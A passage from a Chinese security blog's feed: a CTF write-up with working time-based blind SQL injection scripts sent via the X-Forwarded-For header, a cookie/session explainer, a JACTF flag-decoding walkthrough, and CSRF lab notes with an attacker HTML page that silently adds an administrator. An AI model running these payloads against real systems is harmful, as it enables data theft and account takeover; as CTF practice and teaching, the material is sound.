class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_db.format(i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(payload_db.format(i,j))</span><br><span class="line">            db_name += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'db_name: '</span> + db_name) <span class="comment">#运行后可知数据库名为web15</span></span><br><span class="line"><span class="comment">#表数量破解</span></span><br><span class="line">tb_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_num.format(db_name,str(i))&#125;</span><br><span class="line">        res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        tb_num = i</span><br><span class="line">        print(<span class="string">'tb_num: '</span>+str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#运行后可知有两个表</span></span><br><span class="line"><span class="comment">#表名破解</span></span><br><span class="line">len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(tb_num):</span><br><span class="line">    <span class="comment">#crack length first</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name_len.format(db_name,i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'No.'</span>+str(i+<span class="number">1</span>)+<span class="string">' table has length: '</span> + str(len))</span><br><span class="line">    <span class="comment">#crack name</span></span><br><span class="line">    tb_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name.format(db_name,i,k,j)&#125;</span><br><span class="line">                res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                print(payload_tb_name.format(db_name,i,k,j))</span><br><span class="line">                tb_name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(tb_name)</span><br><span class="line"><span class="comment">#运行后可知两个表为flag和client_ip</span></span><br></pre></td></tr></table></figure><p>猜解列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#crack column number 运行后可知仅有1列</span></span><br><span class="line">target_db = <span class="string">'web15'</span></span><br><span class="line">target_tb = <span class="string">'flag'</span></span><br><span class="line">col_num = <span class="number">0</span></span><br><span class="line">payload_col_num = <span class="string">"1'+(select case when (select count(*) from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;') = '&#123;2&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">payload_col_len = <span class="string">"1'+(select case when (select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;' limit 1 offset &#123;2&#125;) = '&#123;3&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">payload_col_name = <span class="string">"1'+(select case when (substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;' limit 1 offset &#123;2&#125;) from &#123;3&#125; for 1)) = '&#123;4&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_num.format(target_db,target_tb,i)&#125;</span><br><span class="line">        res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        col_num = i</span><br><span class="line">        print(<span class="string">'col_num='</span> + str(col_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#crack column name</span></span><br><span class="line">len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (col_num):</span><br><span class="line">    <span class="comment">#crack column length 运行后可知长度为4</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_len.format(target_db,target_tb,i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            print(<span class="string">'No.'</span> + str(i+<span class="number">1</span>) + <span class="string">' length : '</span> + str(len))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#crack name 运行后可知列名字为flag</span></span><br><span class="line">    col_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_name.format(target_db,target_tb,i,k,j)&#125;</span><br><span class="line">                res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                col_name += j</span><br><span class="line">                print(col_name)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>猜解flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get content 猜解flag</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">paylaod_content = <span class="string">"1'+(select case when (substr((select flag from flag) from &#123;0&#125; for 1)) = '&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:paylaod_content.format(i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(paylaod_content.format(i,j))</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>后面附上大佬们的wp链接：<br><a href="https://blog.csdn.net/jlu16/article/details/86264633" target="_blank" rel="noopener">bugku—INSERT INTO注入解答 - Just for funnnnnnnnnnnn - CSDN博客</a><br><a href="https://www.cnblogs.com/sijidou/p/9657026.html" target="_blank" rel="noopener">bugku web题INSERT INTO注入 - sijidou - 博客园</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刷题~~&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>Cookie</title>
    <link href="http://yoursite.com/2020/02/03/Cookie/"/>
    <id>http://yoursite.com/2020/02/03/Cookie/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:00:20.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><blockquote><p>Cookie 可以翻译为“小甜品，小饼干” ，Cookie 在网络系统中几乎无 处不在，当我们浏览以前访问过的网站时，网页中可能会出现<br>：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。</p></blockquote><a id="more"></a><p>在 Internet 中，Cookie 实际上是指<strong>小量信息，是由 Web 服务器创建的，将信息存储在用户计算机上的文本文件</strong>。Web服务器用HTTP标头将cookie发送到客户端。在客户端终端，浏览器解析cookie并将其保存为本地文件，该文件自动将来自同一服务器的任何请求绑定到这些cookie。一般网络用户习惯用其复数形式 Cookies。</p><blockquote><p>在计算机中，Cookie 是存储在浏览器目录中的文本文件，当浏览器运行时，存储在 RAM<br>（随机存取存储器，也叫主存，是与CPU直接交换数据的内部存储器，可以随时读写（刷新时除外），而且速度很快，通常作为操作系统或其他正在运行中的程序的临时数据存储介质。主存即计算机内部最主要的存储器，用来加载各式各样的程序与数据，以供CPU直接运行与运用。）中发挥作用<br>（此种 Cookies 称作 Session Cookies），一旦用户从该网站或服务器退出，Cookie 可存储在用户本地的硬盘上<br>（此种 Cookies 称作 Persistent Cookies）。 通常情况下，当用户结束浏览器会话时，系统将终止所有的<br>Cookie。当 Web 服务器创建了Cookies 后，只要在其有效期内，当用户访问同一个 Web<br>服务器时，浏览器首先要检查本地的Cookies，并将其原样发送给 Web 服务器。这种状态信息称作“Persistent Client<br>State HTTP Cookie” ，简称为 Cookies。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20191012084153470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过扩展HTTP协议来实现正统cookie分发。服务器通过向HTTP响应头添加特殊指示来提示浏览器生成cookie。纯JavaScript等客户端也可以产生cookie。根据某些原则，浏览器在后台自动发送cookie给服务器，浏览器检查所有的cookie，如果cookie声明范围大于或等于要请求的资源的位置，cookie将添加到请求资源的HTTP标头发送到服务器。</p><p>cookie的内容主要包括：名称，值，到期时间，路径和域。路径与域一起构成了cookie的范围。<br>如果未设置到期时间，则表示此cookie的生命周期是在浏览器会话期间，浏览器窗口关闭，并且cookie消失。<br>生命周期为浏览器会话的cookie称为会话cookie。会话cookie通常不存储在硬盘上，而是存储在内存中。当然，这种行为不受监管。如果设置了到期时间，浏览器会将cookie保存到硬盘，关闭它并再次打开浏览器。在超过设定的到期时间之前，这些cookie仍然有效。存储在硬盘上的Cookie可以在不同的浏览器进程之间共享，例如两个IE窗口。<br>不同的浏览器对存储在内存中的cookie有不同的处理方法。<br>对于IE，在一个打开的窗口上按Ctrl-N（或者从文件菜单）打开的窗口可以与原窗口共享，而使用其他方式新开的IE进程则不能共享已经打开的窗口的内存cookie；对于Mozilla Firefox0.8，所有的进程和标签页都可以共享同样的cookie。一般来说是用javascript的window.open打开的窗口会与原窗口共享内存cookie。浏览器对于会话cookie的这种只认cookie不认人的处理方式经常给采用session机制的web应用程序开发者造成很大的困扰。<br>会话机制使用维护服务器端状态的解决方案。同时，我们也看到，由于服务器端状态保存方案还需要在客户端保存标识符，会话机制可能需要使用cookie机制来达到保存标识符的目的。会话提供了一种管理全局变量的便捷方法。</p><p>该会话适用于每个用户。变量的值存储在服务器上。 sessionID用于区分使用哪个用户会话变量。当用户访问浏览器时，该值将返回给服务器。当客户端禁用cookie时，此值也可以设置为通过get返回给服务器。</p><p>下面就是一个goolge设置cookie的响应头的例子 :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Found </span><br><span class="line">   Location: http://www.google.com/intl/zh-CN/ </span><br><span class="line">   Set-Cookie: PREF=ID=<span class="number">0565</span>f77e132de138:NW=<span class="number">1</span>:TM=<span class="number">1098082649</span>:LM=<span class="number">1098082649</span>:S=KaeaCFPo49RiA_d8; </span><br><span class="line">   expires=Sun, <span class="number">17</span>-Jan<span class="number">-2038</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">07</span> GMT; path=/; domain=.google.com </span><br><span class="line">   Content-Type: text/html</span><br></pre></td></tr></table></figure><p>在安全性方面：当您访问使用会话并在您自己的计算机上创建cookie的站点时，建议服务器端的会话机制更安全，因为它不会任意读取客户端存储的信息。</p><p>文章参照了下面两篇文章，可以好好学习一下。<br><a href="https://baijiahao.baidu.com/s?id=1612804856429135825&wfr=spider&for=pc" target="_blank" rel="noopener">官方解析cookies和session的区别</a><br><a href="https://www.cnblogs.com/wangpei/p/4884840.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangpei/p/4884840.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Cookie 可以翻译为“小甜品，小饼干” ，Cookie 在网络系统中几乎无 处不在，当我们浏览以前访问过的网站时，网页中可能会出现&lt;br&gt;：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JACTF web签到</title>
    <link href="http://yoursite.com/2020/02/03/JACTF%20web%E7%AD%BE%E5%88%B0/"/>
    <id>http://yoursite.com/2020/02/03/JACTF%20web%E7%AD%BE%E5%88%B0/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:11:14.456Z</updated>
    
    <content type="html"><![CDATA[<p>JACTF刷题ing</p><a id="more"></a><p>首先查看源代码，发现3719372767312836781.js可能会有点东西。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>签到<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./3719372767312836781.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /eighteen8.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Additionally, a 404 Not Found</span><br><span class="line">    error was encountered while trying to use an ErrorDocument to handle the request.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">呀，小伙子不错啊，还可以找到这里，是个人才。</span><br><span class="line"></span><br><span class="line">but，flag不在这里，不过还是在这个页面内，你自己看一看。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点开看看，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(102,108,97,103,58,102,108,97,103,95,105,115,95,118,101,114,121,95,101,97,115,121)</span><br></pre></td></tr></table></figure><p>很明显102是“f”的ASCII码，于是用python编写一个脚本，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line">s = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">58</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">121</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    k = chr(i)</span><br><span class="line">    flag += k</span><br><span class="line">print(<span class="string">"web签到的flag是"</span>,flag)</span><br></pre></td></tr></table></figure><p>得到flag:flag_is_very_easy</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JACTF刷题ing&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="http://yoursite.com/2020/02/03/CSRF&amp;SSRF%E7%AE%80%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/03/CSRF&amp;SSRF%E7%AE%80%E6%9E%90/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:02:36.303Z</updated>
    
    <content type="html"><![CDATA[<p>记一下CSRF和SSRF的笔记~~</p><a id="more"></a><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>跨站请求伪造，是一种对网站的恶意利用。XSS利用站点内地信任用户，而CSRF通过伪装来自信任用户的请求来利用受信任的网站。与XSS相比，CSRF攻击往往不大流行（因此对其防范的资源也相对较少）和难以防范，所以被认为比XSS更具危险性。一个场景，跨域发出了一个请求，可以无JavaScript参加，请求是身份认证后的。一般分为HTML CSRF,JOSN HiJacking攻击和Flash CSRF。<br><img src="https://img-blog.csdnimg.cn/2019072818034721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="原理总结"><a href="#原理总结" class="headerlink" title="原理总结"></a>原理总结</h2><p>一个CSRF漏洞攻击的实现，需要由“三个部分”构成：</p><ol><li>有一个漏洞存在（无需验证，任意修改后台数据，新增请求）；</li><li>伪装数据操纵请求的恶意链接或页面；</li><li>诱使用户主动访问或登录恶意链接，触发非法操作。</li></ol><ul><li><input disabled="" type="checkbox"> 第一部分    漏洞的存在</li></ul><p>关键字：跨站请求漏洞（CSR:Cross Site Request）<br>如果需要CSRF攻击能够成功，首先就需要目标站点或系统存在一个可以进行数据修改或新增操作，且此操作被提交后台之后的过程中，其未提供任何身份识别和校验的参数。后台只要收到请求，就立即下发数据修改或新增的操作。<br>以上漏洞情况的存在，出现场景比较多的用户密码的修改、购物地址的修改或后台管理账户的新增等操作过程中。</p><ul><li><input disabled="" type="checkbox"> 第二部分    漏洞利用的伪装</li></ul><p>关键字：伪装请求（F:Forgery）<br>CSRF漏洞存在了，如果需要真正的被利用，还需要对“修改或新增”数据操作请求的伪装，此时恶意攻击者只要将伪装好的“数据修改或新增”的请求发送给被攻击者，或者通过社工的方式诱使被攻击者在其cookie还生效的情况下点击该请求链接，即可触发CSRF漏洞，成功修改或新增当前用户的数据信息，如修改当前用户的密码，又或者是当前用户为后台管理员，触发漏洞后又新增了一个后台管理员。</p><ul><li><input disabled="" type="checkbox"> 第三部分    用户非本意的操作</li></ul><p>关键字：非本意的操作<br>当前用户在不知情的情况下，访问了黑客恶意构造的页面或链接，即在非本意的情况下完成黑客想完成的非法操作，实现了对当前用户个人信息的恶意操作。后台审计只能审计到用户的信息，并不能审计到黑客的信息。</p><h2 id="简单实验"><a href="#简单实验" class="headerlink" title="简单实验"></a>简单实验</h2><p>首先需要一个简单的登录来实现基于session的会话访问控制<br>登录页面：没有用到数据库，账号密码固定<br>登出界面：logout.php，session_destroy()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start[<span class="string">'username'</span>];</span><br><span class="line">$usr=$_POST[<span class="string">'usrname'</span>];</span><br><span class="line">$pwd=$_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($usr==<span class="string">'admin'</span> &amp;&amp; $pwd===<span class="string">'admin'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'登录成功'</span>;</span><br><span class="line">$_SEESION[<span class="string">'admin'</span>]=<span class="number">1</span>;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'登录失败'</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员的界面：模拟一个添加管理员的功能，通过if判断和echo实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'你不是管理员'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$usr=$_GET[<span class="string">'user'</span>];</span><br><span class="line"><span class="comment">//这里模拟一个添加管理员的功能，可以将get传参的内容添加成管理员</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($usr))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'管理员'</span>.usr.<span class="string">'添加成功'</span>;</span><br><span class="line">$log=fopen(<span class="string">"admin.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$usr.<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'请输入想要添加的管理员用户名'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>实验开始：</p><p>首先将login.php，manage.php，logout.php放入本机的php环境，假设本机是管理员使用的机器。本机的ip 127.0.0.1就当作是我们要攻击的服务器的ip，虚拟机的192.168.123.211当作一个管理员和攻击者都可以访问的外网服务器地址。</p><p>现在本机登录管理员界面manage.php，尝试添加管理员，使用的url如下：<br><code>http://127.0.0.1/test/session/csrf/manage.php?user=123</code>（这里url需要和自己搭建的路径一致）此时去读admin.txt，会发现里面成功增加了123。</p><p>现在攻击者在虚拟机中写一个html页面，这个页面的url是：<code>http://192.168.123.211/123/1.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/test/session/csrf/manage.php?user=123"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你看到这个页面并不知道里面是什么内容，如果攻击者给它加上伪装，例如点击链接可以获得优惠券或红包，可能有些用户就会上当了。这时实际上，就会在用户的admin.txt里面添加一个新管理员，于是，用户就受到了csrf攻击。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>构造一个恶意链接或者html页面<br>CSRF漏洞的目的：利用一个已存在的漏洞，构造一个“恶意链接”或者“html页面”，然后诱使用户点击触发此漏洞。<br>目标站点存在一个漏洞（CSRF），攻击者利用此类漏洞伪装了一个“恶意链接”或者“html页面”，诱使被攻击者在登录的情况下（即当前cookie有用的情况下）点击了此伪装请求，随后在用户不知情的情况下完成了对当前用户数据的修改或新增操作，而被修改的信息可能是用户的密码、关键信息又或者是新增后台管理员等。</p><ul><li>如何防范？<br>二次验证（验证cookie）。还有不仅验证cookie，还有验证referer字段、增加token机制等。<br>进行修改或新增操作时，会有相应的信息提示。</li></ul><hr><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF（Server-Side Request 